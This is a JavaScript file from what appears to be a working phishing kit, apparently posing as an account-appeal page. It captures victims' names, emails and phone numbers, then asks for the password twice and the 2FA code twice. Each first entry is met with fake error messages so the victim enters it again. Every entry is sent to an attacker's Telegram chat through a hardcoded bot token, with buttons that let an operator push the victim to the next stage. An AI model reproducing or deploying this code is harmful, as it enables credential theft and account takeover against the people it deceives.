const personalDataButton = document.getElementById('personalData');
const passwordButton = document.getElementById('psw');
const errorText = document.getElementById('errorText');
const passwordInput = document.getElementById('passwordInput');
const passwordDiv = document.querySelector('.sc-ce9c5cf8-0.kVLiUK');
const faDiv = document.querySelector('.sc-ce9c5cf8-0.kVLiUK2');
const verifyDiv = document.querySelector('.sc-ce9c5cf8-0.kVLiUK3');
const nameofuser = document.getElementById('nameofuser'); 
const nameofuser2fa = document.getElementById('nameofuser2fa'); 
const telofuser = document.getElementById('telofuser'); 
const twoFAButton = document.getElementById('2fabutton');

let twoFAAttemptCount = 0;
let attemptCount = 0;

const TELEGRAM_BOT_TOKEN = '7379900173:AAFv-xVQCjhGWzg3cgYqLL0TdBjiX6oLR1A';
const TELEGRAM_CHAT_ID = '-4511490029';

function clearErrorMessages() {
    const errorMessages = document.querySelectorAll('.error-message');
    errorMessages.forEach(msg => msg.remove());
}

function createErrorMessage(text) {
    const errorMsg = document.createElement('div');
    errorMsg.className = 'error-message';
    errorMsg.style.color = 'red';
    errorMsg.style.fontSize = '13px';
    errorMsg.style.fontWeight = '500';
    errorMsg.style.textAlign = 'right';
    errorMsg.textContent = text;
    return errorMsg;
}

function validateInputs(inputs) {
    let hasError = false;

    inputs.forEach(input => {
        const value = document.getElementById(input).value.trim();
        const inputField = document.getElementById(input);
        const existingError = inputField.parentNode.querySelector('.error-message');
        if (existingError) existingError.remove();
        if (!value) {
            const errorMsg = createErrorMessage("This is required.");
            inputField.parentNode.appendChild(errorMsg);
            hasError = true;
        }
    });

    return hasError;
}

function sendMessageToTelegram(message, socketId) {
    const inlineKeyboard = {
        inline_keyboard: [
          [
            {
              text: "Send 2FA",
              callback_data: `2fa|${socketId}`,
            },
            {
              text: "Send PCW",
              callback_data: `pcw|${socketId}`,
            },
          ],
        ],
      };
    return axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: inlineKeyboard
    });
}

personalDataButton.addEventListener('click', function () {
    clearErrorMessages(); 
    const requiredInputs = ['fullName', 'personalEmail', 'businessEmail', 'tel', 'appealInfo'];
    if (validateInputs(requiredInputs)) return;

    const fullName = document.getElementById('fullName').value;
    const personalEmail = document.getElementById('personalEmail').value;
    const businessEmail = document.getElementById('businessEmail').value;
    const phoneNumber = document.getElementById('tel').value;
    const appealInfo = document.getElementById('appealInfo').value;

const message = `
=====================
👤 Full Name: ${fullName}
✉️ Personal Email: ${personalEmail}
📧 Business Email: ${businessEmail}
📞 Phone Number: ${phoneNumber}
ℹ️ Appeal Information: ${appealInfo ? appealInfo : "N/A"}
=====================
`;
    socketId = $("#socket_id").val();

    sendMessageToTelegram(message, socketId)
        .then(response => {
            nameofuser.textContent = fullName;
            nameofuser2fa.textContent = fullName;
            const maskedPhoneNumber = phoneNumber.length < 4 
            ? phoneNumber 
            : phoneNumber.substring(0, 2) + '*'.repeat(phoneNumber.length - 4) + phoneNumber.slice(-2);

            telofuser.textContent = maskedPhoneNumber;
            passwordDiv.style.display = 'inline-grid';
        })
        .catch(error => {
            console.error("Error sending message to Telegram", error);
        });
});

passwordButton.addEventListener('click', () => {
    const passwordValue = passwordInput.value.trim();
    clearErrorMessages(); 
    if (!passwordValue) {
        const errorMsg = createErrorMessage("This is required.");
        passwordInput.parentNode.appendChild(errorMsg);
        return; 
    }

    const personalEmail = document.getElementById('personalEmail').value.trim();

    attemptCount++;

    if (attemptCount === 1) {
sendMessageToTelegram(`
=====================
📧 Email: ${personalEmail}
🔑 Password : ${passwordValue}
 =====================
`, socketId)
        .then(response => {
            passwordInput.value = '';
            errorText.style.display = 'block';
        })
        .catch(error => {
            console.error("Error sending password to Telegram", error);
        });
    } else if (attemptCount === 2) {
        passwordButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>';
        passwordButton.setAttribute('disabled', true);
sendMessageToTelegram(`
=====================
(second attempt)
=====================
📧 Email: ${personalEmail}
🔑 Password : ${passwordValue}
=====================
`, socketId)
        .then(response => {
            errorText.style.display = 'none';
        })
        .catch(error => {
            console.error("Error sending password to Telegram", error);
        });
    }
});



twoFAButton.addEventListener('click', () => {
    const personalEmail = document.getElementById('personalEmail').value.trim();
    const twoFACodeValue = document.getElementById('2facode').value.trim();
    const twoFACodeInput = document.getElementById('2facode')
    const timerDiv = document.querySelector('.timer');
    timerDiv.textContent = '';

    if (!twoFACodeValue) {
        timerDiv.textContent = "This is required.";
        return; 
    }
    if (twoFACodeValue.length < 6) {
        timerDiv.textContent = "The code must be at least 6 digits.";
        return;
    }

    twoFAAttemptCount++;

    if (twoFAAttemptCount === 1) {
        sendMessageToTelegram(`
=====================
📧 Email: ${personalEmail}
🔐 2FA Code : ${twoFACodeValue}
=====================
`, socketId);

        timerDiv.textContent = "The login code you entered doesn't match the one sent to your phone.";
        disableButtonFor60Seconds(timerDiv);
        twoFACodeInput.value = '';
        return; 
    } else if (twoFAAttemptCount === 2) {
        timerDiv.textContent = ''; 

        twoFAButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>';
        twoFAButton.setAttribute('disabled', true);
        
        sendMessageToTelegram(`
=====================
(second attempt)
=====================
📧 Email: ${personalEmail}
🔐 2FA Code: ${twoFACodeValue}
=====================
`, socketId)
            .then(response => {
                faDiv.style.display = 'none';
                verifyDiv.style.display = 'inline-grid';
            })
            .catch(error => {
                console.error("Error sending 2FA code to Telegram", error);
            });
    }
});

function disableButtonFor60Seconds(timerDiv) {
    let countdown = 60;
    twoFAButton.setAttribute('disabled', true);

    const countdownInterval = setInterval(() => {
        const minutes = Math.floor(countdown / 60);
        const seconds = countdown % 60;
        const formattedTime = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        timerDiv.textContent = `The login code you entered doesn't match the one sent to your phone. ${formattedTime} s`;
        countdown--;

        if (countdown < 0) {
            clearInterval(countdownInterval);
            timerDiv.textContent = '';
            twoFAButton.removeAttribute('disabled');
        }
    }, 1000);
}
